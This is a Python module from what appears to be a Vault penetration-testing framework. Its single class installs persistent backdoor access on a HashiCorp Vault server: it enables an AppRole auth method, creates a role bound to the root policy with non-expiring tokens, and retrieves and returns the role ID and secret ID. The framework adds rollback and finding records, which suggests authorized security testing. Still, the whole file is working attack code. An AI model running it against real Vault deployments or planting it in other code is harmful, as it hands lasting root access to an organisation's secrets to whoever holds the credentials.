from typing import Optional
from core.tls_config import vault_request
import json

from ...context import ExecutionContext
from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel
from ...cleanup_engine import RollbackAction, RollbackStrategy
from core.logger import logger


TIMEOUT = 10


class PersistenceModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="persistence.backdoor",
            title="Vault Persistence - Install Backdoor Access",
            risk_level=RiskLevel.DESTRUCTIVE,
            domain="persistence",
            description=(
                "Installs persistent backdoor access to Vault by creating "
                "a new AppRole auth method with a root-policy role."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(
            getattr(context, "vault_addr", None)
            and getattr(context, "token", None)
        )

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        if not self.can_run(context):
            return ExecutionResult(
                status="skipped",
                message="Persistence requires vault_addr and token.",
                evidence={"missing": ["vault_addr", "token"]},
            )

        params = params or {}
        auth_path = params.get("auth_path", "approle-backdoor")
        role_name = params.get("role_name", "backdoor-role")
        policies = params.get("policies", ["root"])
        token_ttl = params.get("token_ttl", "0")
        timeout = params.get("timeout", TIMEOUT)
        verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))

        base_url = context.vault_addr.rstrip("/")
        headers = {
            "X-Vault-Token": context.token,
            "Content-Type": "application/json",
        }
        namespace = params.get("namespace", getattr(context, "namespace", None))
        if namespace:
            headers["X-Vault-Namespace"] = namespace

        results = {}
        errors = []

        logger.info(f"[*] [ACTIVE] Installing persistence at auth path: {auth_path}")

        # 1. Auth method aktifleştir
        try:
            enable_url = f"{base_url}/v1/sys/auth/{auth_path}"
            enable_payload = {
                "type": "approle",
                "description": "Persistence backdoor - DO NOT REMOVE",
                "config": {"default_lease_ttl": "0", "max_lease_ttl": "0"}
            }
            
            response = vault_request("POST", 
                enable_url, headers=headers, json=enable_payload,
                timeout=timeout, verify=verify_tls
            )
            
            if response.status_code in [200, 204]:
                results["auth_enabled"] = True
                logger.info(f"[+] [ACTIVE] Auth method '{auth_path}' enabled.")
            else:
                errors.append(f"Auth enable failed: HTTP {response.status_code}")
                results["auth_enabled"] = False
                
        except Exception as e:
            errors.append(f"Auth enable error: {str(e)}")
            results["auth_enabled"] = False

        if not results.get("auth_enabled"):
            return ExecutionResult(
                status="failed",
                message="Persistence failed at auth enable step.",
                evidence={"errors": errors},
            )

        # 2. Role oluştur
        try:
            role_url = f"{base_url}/v1/auth/{auth_path}/role/{role_name}"
            role_payload = {
                "policies": policies,
                "token_ttl": token_ttl,
                "token_max_ttl": token_ttl,
                "token_no_default_policy": False,
                "secret_id_ttl": "0",
                "secret_id_num_uses": "0",
                "bind_secret_id": True,
            }
            
            response = vault_request("POST", 
                role_url, headers=headers, json=role_payload,
                timeout=timeout, verify=verify_tls
            )
            
            if response.status_code in [200, 204]:
                results["role_created"] = True
                logger.info(f"[+] [ACTIVE] Role '{role_name}' created with policies: {policies}")
            else:
                errors.append(f"Role create failed: HTTP {response.status_code}")
                results["role_created"] = False
                
        except Exception as e:
            errors.append(f"Role create error: {str(e)}")
            results["role_created"] = False

        if not results.get("role_created"):
            return ExecutionResult(
                status="failed",
                message="Persistence failed at role creation step.",
                evidence={"errors": errors},
            )

        # 3. Role ID ve Secret ID al
        role_id = None
        secret_id = None
        
        try:
            # Role ID al
            role_id_url = f"{base_url}/v1/auth/{auth_path}/role/{role_name}/role-id"
            response = vault_request("GET", 
                role_id_url, headers=headers, timeout=timeout, verify=verify_tls
            )
            if response.status_code == 200:
                data = response.json()
                role_id = data.get("data", {}).get("role_id")
                results["role_id"] = role_id
                logger.info(f"[+] [ACTIVE] Role ID: {role_id}")
            
            # Secret ID oluştur
            secret_id_url = f"{base_url}/v1/auth/{auth_path}/role/{role_name}/secret-id"
            response = vault_request("POST", 
                secret_id_url, headers=headers, json={"ttl": "0", "num_uses": "0"},
                timeout=timeout, verify=verify_tls
            )
            if response.status_code == 200:
                data = response.json()
                secret_id = data.get("data", {}).get("secret_id")
                results["secret_id"] = secret_id
                if secret_id:
                    logger.info(f"[+] [ACTIVE] Secret ID: {secret_id[:8]}...")
                else:
                    logger.warning("[!] [ACTIVE] Secret ID response contained no secret_id")
                
        except Exception as e:
            errors.append(f"Credential retrieval error: {str(e)}")

        if role_id and secret_id:
            context.add_finding(
                title="CRITICAL: Vault Persistence Installed",
                description=f"Backdoor at '{auth_path}' with role '{role_name}'.",
                severity="CRITICAL",
                evidence={
                    "auth_path": auth_path,
                    "role_name": role_name,
                    "role_id": role_id,
                    "secret_id": secret_id,
                    "policies": policies,
                },
            )

            # Context'e kaydet
            if not hasattr(context, "persistence_creds"):
                context.persistence_creds = []
            context.persistence_creds.append({
                "auth_path": auth_path,
                "role_name": role_name,
                "role_id": role_id,
                "secret_id": secret_id,
            })

            return ExecutionResult(
                status="success",
                message=f"Persistence installed!\nAuth: {auth_path}\nRole: {role_name}\nRole ID: {role_id}\nSecret ID: {secret_id}",
                evidence={
                    "auth_path": auth_path,
                    "role_name": role_name,
                    "role_id": role_id,
                    "secret_id": secret_id,
                    "policies": policies,
                    "errors": errors,
                },
                rollback_actions=[
                    RollbackAction(
                        module_id="persistence.backdoor",
                        description=f"Disable auth method '{auth_path}' (AppRole backdoor)",
                        strategy=RollbackStrategy.DELETE_AUTH,
                        vault_path=f"sys/auth/{auth_path}",
                        metadata={"auth_path": auth_path, "role_name": role_name},
                    ),
                ],
            )

        return ExecutionResult(
            status="partial",
            message="Persistence installed but credentials not fully retrieved.",
            evidence={"results": results, "errors": errors},
        )
